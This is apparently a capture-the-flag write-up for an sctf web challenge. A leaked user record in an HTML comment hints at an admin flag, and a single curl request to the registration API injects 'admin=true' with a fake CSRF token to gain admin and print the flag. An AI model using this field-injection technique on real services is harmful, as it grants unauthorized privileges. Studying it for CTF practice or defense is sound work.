Upon registering and logging in, we are met with a message saying that we are not admin.
Looking at the source of the page reveals the following:

<!--
Error: user.admin is not equal to true.
{
	"_id": "5708479b9c95b4060089562b",
	"username": "username",
	"password": "$2a$10$DxaT/Su/XgKPt2GNo..4kOJCZrPIsHoU1VOTw.rgja8KpkvnK/HzK",
	"uid": "9hrbgazb0bzuan7ije9cis8fd"
}
-->

Looking at the javascript used to register a user, it seems like we can inject values into the post request, and
those values will show up in our user config.
Since our user is not admin, let's create a user that is.

$ curl cpanel.sctf.michaelz.xyz/api/user/register --data "_csrf=fake&username=insane&password=password&admin=true"

sctf{TIL_noSql_cAn_bE_InjeKT3d_t0o}
